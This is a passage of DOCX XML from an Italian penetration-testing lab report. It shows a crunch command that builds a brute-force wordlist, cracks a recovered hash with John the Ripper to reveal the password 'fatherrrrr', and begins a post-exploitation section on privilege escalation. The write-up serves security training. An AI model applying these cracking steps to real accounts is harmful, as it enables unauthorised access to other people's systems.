      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> con</w:t>
      </w:r>
      <w:r w:rsidR="00B41D73">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, stringhe di lunghezza </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B41D73">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B41D73">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> e con il formatto detto in precedenza e salvati all’interno del file</w:t>
      </w:r>
      <w:r w:rsidR="00B41D73" w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AF2CF9" w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidR="00B41D73" w:rsidRPr="00C22492">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.txt</w:t>
      </w:r>
      <w:r w:rsidR="00B41D73">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. La</w:t>
      </w:r>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C22492" w:rsidRPr="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wordlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B41D73">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">create </w:t>
      </w:r>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">verrà utilizzata per il </w:t>
      </w:r>
      <w:r w:rsidR="00C22492" w:rsidRPr="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>password cracking</w:t>
      </w:r>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FE4692" w14:textId="606A53FA" w:rsidR="006C1913" w:rsidRPr="000A5C5D" w:rsidRDefault="00C22492" w:rsidP="00C22492">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Tramite il comando: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C22492">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">crunch 10 10 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C22492">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>aefhrt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C22492">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:r w:rsidR="00AF2CF9" w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidR="00AF2CF9" w:rsidRPr="00C22492">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.txt</w:t>
      </w:r>
      <w:r w:rsidR="00744F05">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="000A5C5D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Vengono mostrati in output anche il numero di righe che crunch crea: </w:t>
      </w:r>
      <w:r w:rsidR="00744F05" w:rsidRPr="000A5C5D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>60466176.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2398D6C9" w14:textId="1F761AE8" w:rsidR="00744F05" w:rsidRDefault="000A5C5D" w:rsidP="00C22492">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00744F05">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>uccessivamente andiamo a creare un file hash.txt con all’interno</w:t>
      </w:r>
      <w:r w:rsidR="00AF2CF9">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> l’hash</w:t>
      </w:r>
      <w:r w:rsidR="006C1913">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> recuperato in precedenza.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389340B3" w14:textId="1C39A697" w:rsidR="006C1913" w:rsidRDefault="000A5C5D" w:rsidP="00C22492">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00744F05">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">on l’aiuto di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00744F05" w:rsidRPr="000A5C5D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>john</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00744F05" w:rsidRPr="000A5C5D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> ripper</w:t>
      </w:r>
      <w:r w:rsidR="00744F05">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> andiamo a decifrare il valore hash</w:t>
      </w:r>
      <w:r w:rsidR="00AF2CF9">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> e ad individuare la password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735118A3" w14:textId="18AE8B85" w:rsidR="006C1913" w:rsidRDefault="006C1913" w:rsidP="00C22492">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>All’interno della Figura 20 abbiamo i comandi di crunch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0569D07C" w14:textId="476FE423" w:rsidR="006C1913" w:rsidRDefault="006C1913" w:rsidP="00C22492">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">All’interno della Figura 21 abbiamo i comandi di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>john</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00AF2CF9">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178DB153" w14:textId="0713E863" w:rsidR="00744F05" w:rsidRPr="00744F05" w:rsidRDefault="006C1913" w:rsidP="00C22492">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>La creazione del file hash.txt è avvenuta dall’interfaccia grafica.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228075BF" w14:textId="72E43589" w:rsidR="00C22492" w:rsidRPr="00C22492" w:rsidRDefault="00C22492" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B673C1F" w14:textId="4AE6F71D" w:rsidR="006C1913" w:rsidRPr="006C1913" w:rsidRDefault="006C1913" w:rsidP="006C1913">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73C79E2D" wp14:editId="59E60AB2">
            <wp:extent cx="5274310" cy="1078230"/>
            <wp:effectExtent l="0" t="0" r="2540" b="7620"/>
            <wp:docPr id="136444292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42921" name="Immagine 1" descr="Immagine che contiene testo, Carattere, schermata&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId51"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1078230"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 20: comandi crunch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D044636" w14:textId="3E183933" w:rsidR="006C1913" w:rsidRPr="00920FBC" w:rsidRDefault="007E756F" w:rsidP="00920FBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251698176" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="42572222" wp14:editId="2211EB90">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>821919</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="496257" cy="122830"/>
                <wp:effectExtent l="0" t="0" r="18415" b="10795"/>
                <wp:wrapNone/>
                <wp:docPr id="549398539" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="496257" cy="122830"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="0B1C8598" w14:textId="77777777" w:rsidR="007E756F" w:rsidRDefault="007E756F" w:rsidP="007E75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72222" id="_x0000_s1047" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:64.7pt;width:39.1pt;height:9.6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pUgIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+x46SuoU2QtMgwI&#10;2gDt0DMjS7EBWdIoJXb260fJeXTdTsMuMilSfHz86Nu7vtVsJ9E31pR8PMo5k0bYqjGbkn9/WXy6&#10;5swHMBVoa2TJ99Lzu9nHD7edm8rC1lZXEhkFMX7auZLXIbhplnlRyxb8yDppyKgsthBIxU1WIXQU&#10;vdVZkeeXWWexcmiF9J5uHwYjn6X4SkkRnpTyMjBdcqotpBPTuY5nNruF6QbB1Y04lAH/UEULjaGk&#10;p1APEIBtsfkjVNsItN6qMBK2zaxSjZCpB+pmnL/r5rkGJ1MvBI53J5j8/wsrHnfPboUEQ+f81JMY&#10;u+gVtvFL9bE+gbU/gSX7wARdTm4ui4srzgSZxkVx/TmBmZ0fO/Thq7Qti0LJkWaRIILd0gdKSK5H&#10;l5jL2EWjdZqHNqwreXExyWlkAogWSkMgsXVVyb3ZcAZ6Q3wTAVNIb3VTxecxkMfN+l4j20Gcef4l&#10;Xxwr+80t5n4AXw9+yRTZQFVpE8PIxJ5DqWdwohT6dc8aKqUYxyfxam2r/QoZ2oFh3olFQwmW4MMK&#10;kChFndCahCc6lLbUnj1InNUWf/7tPvrTpMnKWUcUpdZ/bAElZ/qbIQ7cjCeTyOmkTC6uClLwrWX9&#10;1mK27b0lRMa0kE4kMfoHfRQV2vaVtmkes5IJjKDcA8gH5T4Mq0P7KOR8ntyIxw7C0jw7EYNH6CK0&#10;L/0roDvMPhBpHu2RzjB9R4HBdyDBfBusahI/zrjSWKJCO5AGdNjXuGRv9eR1/qvMfgEAAP//AwBQ&#10;SwMEFAAGAAgAAAAhALBnMQTcAAAABwEAAA8AAABkcnMvZG93bnJldi54bWxMj8FOwzAQRO9I/IO1&#10;SNyoQ1rRNMSpEBIShyJB2w9w420SEa8je9umf89yguPMrGbeVuvJD+qMMfWBDDzOMlBITXA9tQb2&#10;u7eHAlRiS84OgdDAFROs69ubypYuXOgLz1tulZRQKq2BjnkstU5Nh96mWRiRJDuG6C2LjK120V6k&#10;3A86z7In7W1PstDZEV87bL63J2/Ab5pV5Pd2vv+cF9dNv2N99B/G3N9NL8+gGCf+O4ZffEGHWpgO&#10;4UQuqcGAPMLi5qsFKImXRQ7qIMaiWIKuK/2fv/4BAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+&#10;AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAA&#10;ACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAA&#10;ACEAfqmbaVICAACdBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYA&#10;CAAAACEAsGcxBNwAAAAHAQAADwAAAAAAAAAAAAAAAACsBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAA&#10;AAAEAAQA8wAAALUFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0B1C8598" w14:textId="77777777" w:rsidR="007E756F" w:rsidRDefault="007E756F" w:rsidP="007E756F">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006C1913" w:rsidRPr="006C1913">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08B9A5F3" wp14:editId="2B5CFC57">
            <wp:extent cx="5274310" cy="1302385"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="171667282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72827" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId52"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1302385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00920FBC" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="00920FBC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00920FBC" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00920FBC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">output </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00920FBC">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>john</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7502E0A3" w14:textId="77777777" w:rsidR="00920FBC" w:rsidRDefault="00920FBC" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="214978DE" w14:textId="120772E3" w:rsidR="00920FBC" w:rsidRDefault="000A5C5D" w:rsidP="000A5C5D">
      <w:r w:rsidRPr="0092245E">
        <w:t xml:space="preserve">Di conseguenza, abbiamo trovato la password: " </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000A5C5D">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fatherrrrr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0092245E">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0092245E">
        <w:t>" per il valore hash</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0092245E">
        <w:t>specificato</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E42A4FA" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="4B89C5AC" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="33B7B7C0" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="69C64C19" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="1285DA82" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="5F5101BA" w14:textId="77777777" w:rsidR="008D2168" w:rsidRPr="008D2168" w:rsidRDefault="008D2168" w:rsidP="008D2168">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="it-IT" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="it-IT" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>9 Post Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E243D2B" w14:textId="7312BA00" w:rsidR="00BA6A2B" w:rsidRPr="00877FB6" w:rsidRDefault="008D2168" w:rsidP="00877FB6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Le informazioni </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00877FB6" w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>che sono state acquisite durante le fasi precedenti</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00877FB6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>permettono di poter accedere alla</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>macchin</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> target. Tuttavia, è necessario acquisire ulteriori privilegi</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
